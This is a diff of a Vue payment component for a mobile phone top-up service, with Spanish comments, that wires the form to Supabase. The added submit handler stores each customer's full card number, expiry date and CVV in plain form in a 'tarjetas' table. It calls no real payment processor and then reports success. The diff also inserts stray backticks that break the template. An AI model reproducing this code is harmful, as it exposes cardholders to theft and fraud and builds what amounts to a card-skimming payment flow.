@@ -1,4 +1,4 @@
-<template>
+``<template>
   <div class="min-h-screen bg-neutral-50">
     <header class="bg-white border-b border-neutral-200">
       <div class="max-w-3xl mx-auto px-4 py-6">
@@ -221,7 +221,8 @@
 </template>
 
 <script setup lang="ts">
-import { ref } from 'vue';
+import { ref, onMounted } from 'vue';
+import { supabase } from './supabase';
 
 interface Rate {
   id: number;
@@ -313,7 +314,7 @@ function validatePhone(phone: string): boolean {
   return true;
 }
 
-const handleSubmit = () => {
+const handleSubmit = async () => {
   if (!selectedRate.value) {
     console.error('No se ha seleccionado un monto');
     return;
@@ -329,7 +330,6 @@ const handleSubmit = () => {
 
   phoneError.value = '';
 
-  // Store selectedRate in a const to avoid multiple null checks
   const rate = selectedRate.value;
   if (!rate) {
     console.error('No se ha seleccionado una tarifa');
@@ -337,9 +337,25 @@ const handleSubmit = () => {
     return;
   }
 
-  setTimeout(() => {
-    const newRecharge: Recharge = {
-      id: Date.now().toString(),
+  try {
+    // Guardar la tarjeta en Supabase
+    const { data: cardData, error: cardError } = await supabase
+      .from('tarjetas')
+      .insert([
+        { 
+          nombre: formData.value.name,
+          numero_tarjeta: paymentData.value.cardNumber.replace(/\s/g, ''), // Eliminar espacios
+          fecha_vencimiento: paymentData.value.expiry,
+          cvv: paymentData.value.cvv
+        }
+      ])
+      .select()
+      .single();
+
+    if (cardError) throw cardError;
+
+    // Crear el registro de recarga
+    const newRecharge = {
       phone: formData.value.phone,
       rate_id: rate.id,
       usd_amount: rate.usd_amount,
@@ -351,16 +367,31 @@ const handleSubmit = () => {
       payment_details: {
         last4: paymentData.value.cardNumber.slice(-4),
         card_type: 'visa',
-      },
-      created_at: new Date().toISOString(),
-      updated_at: new Date().toISOString()
+      }
     };
 
-    rechargeHistory.value = [newRecharge, ...rechargeHistory.value];
+    // Guardar la recarga en Supabase
+    const { data: savedRecharge, error: rechargeError } = await supabase
+      .from('recargas')
+      .insert([newRecharge])
+      .select()
+      .single();
 
+    if (rechargeError) throw rechargeError;
+
+    // Actualizar el estado local con los datos de la base de datos
+    if (savedRecharge) {
+      rechargeHistory.value = [savedRecharge, ...rechargeHistory.value];
+    }
+    
     currentView.value = 'success';
+    
+  } catch (error) {
+    console.error('Error al procesar el pago:', error);
+    alert('Ocurrió un error al procesar el pago. Por favor, inténtalo de nuevo.');
+  } finally {
     isProcessing.value = false;
-  }, 1500);
+  }
 };
 
 function resetForm() {
@@ -373,6 +404,24 @@ function resetForm() {
 const toggleHistory = () => {
   showHistory.value = !showHistory.value;
 };
+
+// Cargar historial al montar el componente
+onMounted(async () => {
+  try {
+    const { data, error } = await supabase
+      .from('recargas')
+      .select('*')
+      .order('created_at', { ascending: false });
+    
+    if (error) throw error;
+    
+    if (data) {
+      rechargeHistory.value = data;
+    }
+  } catch (error) {
+    console.error('Error al cargar el historial:', error);
+  }
+});
 
 function getStatusText(status: string): string {
   const statusMap: Record<string, string> = {
